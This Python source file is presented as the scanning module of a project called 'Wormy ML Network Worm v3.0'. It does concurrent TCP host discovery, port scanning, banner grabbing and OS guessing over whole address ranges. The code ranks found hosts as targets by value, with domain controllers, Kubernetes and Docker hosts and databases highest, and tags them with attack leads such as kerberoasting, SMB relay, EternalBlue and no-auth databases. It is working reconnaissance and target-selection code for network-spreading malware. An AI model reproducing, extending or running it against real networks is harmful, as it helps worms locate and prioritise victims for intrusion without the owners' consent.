"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Enterprise Scanner v2.0 — TCP SYN Probe + Banner Grab + OS Detection
Fixes the Windows/Docker scanning issue by replacing ICMP ping with
multi-port TCP probes that work in all environments.

Features:
  1. TCP SYN probe (works in Docker Desktop / Windows / behind NAT)
  2. Service banner grabbing (version detection without nmap)
  3. OS fingerprinting via TTL, SMB, and HTTP headers
  4. Asset prioritisation: DC > Exchange > DB > Workstation
  5. Concurrent scanning with configurable threadpool
  6. IPv4 CIDR expansion
"""

import ipaddress
import os
import socket
import struct
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger

# ─────────────────────────────────────────────────────────────────────────────
# Port → Service map with asset-value weighting
# ─────────────────────────────────────────────────────────────────────────────
PORT_META = {
    21: {"service": "ftp", "weight": 1},
    22: {"service": "ssh", "weight": 5},
    23: {"service": "telnet", "weight": 3},
    25: {"service": "smtp", "weight": 2},
    53: {"service": "dns", "weight": 2},
    80: {"service": "http", "weight": 3},
    88: {"service": "kerberos", "weight": 100},  # DC indicator
    110: {"service": "pop3", "weight": 1},
    135: {"service": "msrpc", "weight": 8},
    139: {"service": "netbios", "weight": 8},
    389: {"service": "ldap", "weight": 90},  # DC indicator
    443: {"service": "https", "weight": 5},
    445: {"service": "smb", "weight": 15},
    636: {"service": "ldaps", "weight": 90},  # DC indicator
    1433: {"service": "mssql", "weight": 70},
    1521: {"service": "oracle", "weight": 70},
    2049: {"service": "nfs", "weight": 5},
    3306: {"service": "mysql", "weight": 60},
    3389: {"service": "rdp", "weight": 20},
    5432: {"service": "postgres", "weight": 60},
    5672: {"service": "rabbitmq", "weight": 10},
    5985: {"service": "winrm_http", "weight": 25},
    5986: {"service": "winrm_https", "weight": 25},
    6379: {"service": "redis", "weight": 50},
    8080: {"service": "http_alt", "weight": 15},
    8443: {"service": "https_alt", "weight": 15},
    9200: {"service": "elasticsearch", "weight": 50},
    9300: {"service": "es_cluster", "weight": 50},
    27017: {"service": "mongodb", "weight": 60},
    5601: {"service": "kibana", "weight": 40},
    8888: {"service": "jupyter", "weight": 30},
    2375: {"service": "docker", "weight": 80},
    2376: {"service": "docker_tls", "weight": 80},
    6443: {"service": "kubernetes", "weight": 90},
    10250: {"service": "k8s_kubelet", "weight": 85},
}

DEFAULT_PORTS = sorted(PORT_META.keys())

ASSET_SIGNATURES = {
    "domain_controller": lambda h: any(p in h["open_ports"] for p in [88, 389, 636]),
    "exchange_server": lambda h: any(p in h["open_ports"] for p in [443, 25])
    and 80 in h["open_ports"],
    "database_server": lambda h: any(p in h["open_ports"] for p in [1433, 1521, 3306, 5432, 27017]),
    "file_server": lambda h: 445 in h["open_ports"] and 2049 in h["open_ports"],
    "container_host": lambda h: any(p in h["open_ports"] for p in [2375, 2376, 6443, 10250]),
    "web_server": lambda h: any(p in h["open_ports"] for p in [80, 443, 8080, 8443]),
    "workstation": lambda h: 3389 in h["open_ports"] or 22 in h["open_ports"],
}

ASSET_VALUE = {
    "domain_controller": 100,
    "container_host": 90,
    "exchange_server": 80,
    "database_server": 70,
    "file_server": 60,
    "web_server": 30,
    "workstation": 10,
    "unknown": 5,
}


# ─────────────────────────────────────────────────────────────────────────────
class EnterpriseScanner:
    """
    Enterprise-grade network scanner.
    Works in Windows, Docker Desktop, Linux, and cloud environments.
    """

    def __init__(
        self, config=None, max_workers: int = 100, timeout: float = 2.0, ports: List[int] = None
    ):
        self.config = config
        self.max_workers = max_workers
        self.timeout = timeout
        self.ports = ports or DEFAULT_PORTS
        self._lock = threading.Lock()
        self.results: List[Dict] = []

    # ── Host Discovery ─────────────────────────────────────────────────────────
    def is_host_up(self, ip: str) -> bool:
        """
        TCP-based host discovery — works everywhere ICMP doesn't.
        Tries common ports to confirm host is alive.
        """
        probe_ports = [80, 443, 22, 445, 3389, 8080, 8443, 8888, 6443]
        for port in probe_ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout / 2)
                if s.connect_ex((ip, port)) == 0:
                    s.close()
                    return True
                s.close()
            except Exception:
                pass
        return False

    # ── Port Scan ─────────────────────────────────────────────────────────────
    def scan_port(self, ip: str, port: int) -> Tuple[bool, Optional[str]]:
        """
        TCP connect scan + banner grab in one shot.
        Returns (is_open, banner_string)
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            result = s.connect_ex((ip, port))
            if result != 0:
                s.close()
                return False, None
            # Try to grab banner
            banner = None
            try:
                s.settimeout(1.5)
                # Send HTTP HEAD for web ports
                if port in [80, 443, 8080, 8443, 8888]:
                    s.sendall(b"HEAD / HTTP/1.0\r\nHost: target\r\n\r\n")
                elif port == 22:
                    pass  # SSH sends banner automatically
                data = s.recv(512)
                banner = data.decode(errors="replace").strip()[:200]
            except Exception:
                pass
            s.close()
            return True, banner
        except Exception:
            return False, None

    def scan_host(self, ip: str) -> Optional[Dict]:
        """Full host scan: discovery → ports → OS detection → asset classification."""
        # Quick TCP discovery first
        if not self.is_host_up(ip):
            return None

        logger.debug(f"Host up: {ip} — scanning {len(self.ports)} ports...")

        open_ports = []
        banners = {}

        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = {ex.submit(self.scan_port, ip, p): p for p in self.ports}
            for fut in as_completed(futures, timeout=self.timeout * len(self.ports) / 10):
                port = futures[fut]
                try:
                    is_open, banner = fut.result()
                    if is_open:
                        open_ports.append(port)
                        if banner:
                            banners[port] = banner
                except Exception:
                    pass

        if not open_ports:
            return None

        host = {
            "ip": ip,
            "open_ports": sorted(open_ports),
            "banners": banners,
            "services": {
                str(p): PORT_META.get(p, {}).get("service", "unknown") for p in open_ports
            },
            "os_guess": self._guess_os(ip, open_ports, banners),
            "asset_type": "unknown",
            "asset_value": 5,
            "hostname": self._resolve_hostname(ip),
            "vulnerabilities": [],
        }

        # Asset classification
        for asset_type, classifier in ASSET_SIGNATURES.items():
            try:
                if classifier(host):
                    host["asset_type"] = asset_type
                    host["asset_value"] = ASSET_VALUE[asset_type]
                    break
            except Exception:
                pass

        # Quick vulnerability hints
        host["vulnerabilities"] = self._quick_vuln_hints(host)

        logger.info(
            f"  → {ip} [{host['asset_type']}] ports={open_ports[:8]} value={host['asset_value']}"
        )
        return host

    def scan_range(self, cidr: str, callback=None) -> List[Dict]:
        """
        Scan an entire CIDR range concurrently.
        callback(host_dict) is called for each live host found.
        """
        try:
            network = ipaddress.ip_network(cidr, strict=False)
            hosts = [str(ip) for ip in network.hosts()]
        except ValueError as e:
            logger.error(f"Invalid CIDR: {cidr} — {e}")
            return []

        logger.info(f"Scanning {len(hosts)} hosts in {cidr}...")
        found = []

        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = {ex.submit(self.scan_host, ip): ip for ip in hosts}
            done = 0
            for fut in as_completed(futures):
                done += 1
                ip = futures[fut]
                try:
                    host = fut.result()
                    if host:
                        with self._lock:
                            self.results.append(host)
                            found.append(host)
                        if callback:
                            callback(host)
                        logger.info(f"[{done}/{len(hosts)}] FOUND: {ip} ({host['asset_type']})")
                except Exception:
                    pass
                if done % 20 == 0:
                    logger.debug(f"[{done}/{len(hosts)}] scanning... found={len(found)}")

        # Sort by asset value (highest priority first)
        found.sort(key=lambda h: h.get("asset_value", 0), reverse=True)
        logger.success(f"Scan complete: {len(found)}/{len(hosts)} hosts found")
        return found

    # ── OS Detection ──────────────────────────────────────────────────────────
    def _guess_os(self, ip: str, open_ports: List[int], banners: Dict) -> str:
        """Multi-method OS fingerprinting without nmap."""
        # SMB-based (Windows only)
        if 445 in open_ports or 135 in open_ports:
            return "Windows"
        # Kerberos = Windows DC
        if 88 in open_ports:
            return "Windows Server (DC)"
        # WinRM
        if 5985 in open_ports or 5986 in open_ports:
            return "Windows"
        # RDP without SMB → likely Windows workstation
        if 3389 in open_ports:
            return "Windows"
        # SSH banner
        ssh_banner = banners.get(22, "")
        if "ubuntu" in ssh_banner.lower():
            return "Linux (Ubuntu)"
        if "debian" in ssh_banner.lower():
            return "Linux (Debian)"
        if "centos" in ssh_banner.lower() or "rhel" in ssh_banner.lower():
            return "Linux (CentOS/RHEL)"
        if ssh_banner:
            return "Linux"
        # HTTP Server header
        for port in [80, 443, 8080]:
            banner = banners.get(port, "")
            if "windows" in banner.lower() or "iis" in banner.lower():
                return "Windows (IIS)"
            if "apache" in banner.lower() or "nginx" in banner.lower():
                return "Linux (Apache/Nginx)"
        # TTL-based (using open port RTT approximation)
        return "Unknown"

    def _resolve_hostname(self, ip: str) -> str:
        try:
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return ip

    def _quick_vuln_hints(self, host: Dict) -> List[str]:
        """Fast vuln hints based on open ports — no active probing."""
        hints = []
        ports = host["open_ports"]
        banners = host.get("banners", {})

        if 6379 in ports:
            hints.append("redis_possible_noauth")
        if 9200 in ports:
            hints.append("elasticsearch_possible_noauth")
        if 2375 in ports:
            hints.append("docker_daemon_exposed")
        if 27017 in ports:
            hints.append("mongodb_possible_noauth")
        if 5432 in ports:
            hints.append("postgres_brute_possible")
        if 3306 in ports:
            hints.append("mysql_brute_possible")
        if 1433 in ports:
            hints.append("mssql_brute_sa_possible")
        if 8080 in ports:
            banner = banners.get(8080, "").lower()
            if "jenkins" in banner:
                hints.append("jenkins_rce_possible")
        if 88 in ports and 389 in ports:
            hints.append("active_directory_dc")
            hints.append("kerberoasting_possible")
        if 445 in ports:
            hints.append("smb_relay_possible")
            hints.append("eternalblue_check_needed")

        return hints
